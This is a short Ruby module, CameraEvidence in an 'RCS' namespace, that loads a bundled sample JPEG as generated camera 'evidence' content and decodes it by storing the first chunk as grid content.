require 'rcs-common/evidence/common'

module RCS

module CameraEvidence
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'camera', '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content
    @info[:grid_content] = @info[:chunks].first
    return [self]
  end
end

end # ::RCS